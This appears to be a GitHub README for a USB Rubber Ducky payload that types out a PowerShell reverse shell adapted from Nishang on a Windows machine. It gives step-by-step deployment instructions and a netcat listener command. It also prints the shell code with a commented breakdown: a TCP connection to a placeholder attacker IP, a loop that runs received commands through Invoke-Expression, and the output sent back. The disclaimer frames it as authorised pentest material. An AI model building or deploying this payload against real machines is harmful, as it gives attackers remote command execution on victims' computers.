# Three Second Reverse Shell (Windows)

A reverse shell is an invaluable tool in penetration testing, allowing an attacker to remotely execute commands on a target system by having the target system initiate a connection back to the attacker's listening device. This project demonstrates how to create a quick and effective reverse shell using PowerShell, leveraging the capabilities of Nishang, a collection of penetration testing scripts and payloads written in PowerShell. The focus is on implementing a netcat-like reverse shell that calls back to an attacker's machine where netcat listens on a specified port.

## Disclaimer

The tools and scripts provided in this repository are made available for educational purposes only and are intended to be used for testing and protecting systems with the consent of the owners. The author does not take any responsibility for the misuse of these tools. It is the end user's responsibility to obey all applicable local, state, national, and international laws. The developers assume no liability and are not responsible for any misuse or damage caused by this program. Under no circumstances should this tool be used for malicious purposes. The author of this tool advocates for the responsible and ethical use of security tools. Please use this tool responsibly and ethically, ensuring that you have proper authorization before engaging any system with the techniques demonstrated by this project.

## Features

This DuckyScript leverages PowerShell to initiate a reverse shell connection back to a listening attacker-controlled server on a specific port. The reverse shell enables the attacker to execute commands remotely on the Windows target system. The payload uses the Nishang PowerShell script for reverse shells. It's structured for use directly in a command line or script where the variables can be substituted dynamically.

## Prerequisites

- **Operating System**: Tested on Windows 10 x64, version 22H2, Kali Linux 2023.4
- **Payload Studio**: Tested with Payload Studio Pro version 1.3.1
- **DuckyScript Version**: DuckScript 3.0 Advanced
- **Hardware**: USB Rubber Ducky (2022)

## Usage

### **Step 1: Prepare the PowerShell Reverse Shell Script**

1. **Obtain the Script**: 
    - Nishang's scripts are designed for penetration testing and offer a wide range of functionalities, including reverse shells. Access the Nishang GitHub repository and locate the `Invoke-PowerShellTcpOneLine.ps1` script. The script is available at: https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1
2. **Modify the Script for Your Environment**:
    - Replace the hardcoded IP address `YOUR_IP` and port number `YOUR_PORT` within the script to match your attacking machine's IP and the listening port you intend to use for incomming connections.

### Step 2: **Convert the PowerShell Script to DuckyScript**

- **Encode the PowerShell Command**: Convert the PowerShell command into a format suitable for DuckyScript. The goal is to have the USB Rubber Ducky execute the modified Nishang script on the target computer. Ensure the entire PowerShell command is correctly formatted to run in a single line, as this will be typed out by the Rubber Ducky.

### Step 3: **Set Up the Netcat Listener**

1. **Prepare Your Attacker Machine (Kali Linux)**:
    - Open a terminal then start a netcat listener using the specified port with the command: `nc -lvnp YOUR_PORT`
        
        <aside>
        ⚠️ To check if a specific port is available for listening on Kali Linux run:
        `netstat -tuln | grep <port_number>`
        OR
        `ss -tuln | grep <port_number>`
        If there's no output, the port is not being used.
        
        </aside>
        
2. **Testing Port Accessibility**:
    - Ensure your firewall allows incoming connections on the port you've chosen.
    - Use `nc` (netcat) to listen on the port temporarily and then try to connect to it from another host. If the connection is successful, the port is open for inbound traffic.
    - The Windows equivalent of `nc` (Netcat) is often considered to be PowerShell's `Test-NetConnection` cmdlet for basic networking tasks.
        - On the server (Kali Linux), listen on a specific port: `nc -lvp <port number>`
        - On a client machine (Windows), try to connect to the port: `Test-NetConnection -ComputerName <hostname> -Port <portnumber>`

### **Step 4: Deploy the Payload**

- **Load and Execute on Target**: Load the DuckyScript payload onto your USB Rubber Ducky, insert it into the target system, and let it execute. The script will automatically open PowerShell, inject the reverse shell script, and initiate a connection back to your netcat listener.

### Step 5: **Interact with the Reverse Shell**

- **Command Execution**: Once the reverse shell connection is established, you can begin executing commands on the target system from your attacker machine via the netcat listener.

## How It Works

### DuckyScript Payload:

- Executes a PowerShell command that establishes a TCP connection to the attacker's listening server. It continuously reads commands from the attacker, executes them, and sends the results back.
- For this to work, you must have a listener set up on your attacker-controlled server. This can be done with a simple Netcat command: `nc -lp YOUR_PORT`, where `YOUR_PORT` is the port you've specified in the DuckyScript.

### PowerShell Reverse Shell Components:

**Establishing a Connection:**

- **TCPClient Object Creation**:
    
    `$client = New-Object System.Net.Sockets.TCPClient('YOUR_IP',YOUR_PORT);`
    
- Initiates a new TCP connection to the specified IP address and port number, creating a `TCPClient` object.

**Opening a Stream:**

- **Getting the Network Stream**: `$stream = $client.GetStream();`
- Retrieves the network data stream associated with the `TCPClient` object for sending and receiving data.

**Preparing to Receive Data:**

- **Byte Array Initialization**: `[byte[]]$bytes = 0..65535|%{0};`
- Creates a byte array (`$bytes`) to store data received from the network stream. The array size is set to 65536 bytes, accommodating the maximum size of TCP data that can be received in one go.

**Reading and Executing Commands:**

- **Command Execution Loop**:
    
    ```powershell
    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
      $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
      $sendback = (iex $data 2>&1 | Out-String );
      $sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';
      $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
      $stream.Write($sendbyte,0,$sendbyte.Length);
      $stream.Flush();
    };
    ```
    
- **Reading Data**: Continuously reads data from the network stream into the `$bytes` array. The `Read` method returns the number of bytes read, which is stored in `$i`.
- **Command Execution**: Received bytes are converted to a string (`$data`), which is then executed as a PowerShell command using `Invoke-Expression (iex)`. The command output is captured and converted to a string.
- **Preparing Response**: Output string is concatenated with the current PowerShell path to simulate a shell environment, then converted back to bytes.
- **Sending Response**: The byte array is sent back to the attacker through the network stream, and the stream is flushed to ensure all data is sent immediately.

**Closing the Connection:**

- **Terminating the Connection**: `$client.Close();`
- Closes the TCP connection once the loop ends (e.g., when the connection is terminated by the attacker).

## Output Example

![DuckyScript Payload Results](/images/reverse_shell_results.png)

## Contributing

If you have an idea for an improvement or if you're interested in collaborating, you are welcome to contribute. Please feel free to open an issue or submit a pull request.

## License

This project is licensed under the GNU General Public (GPL) License - see the [LICENSE](LICENSE) file for details.
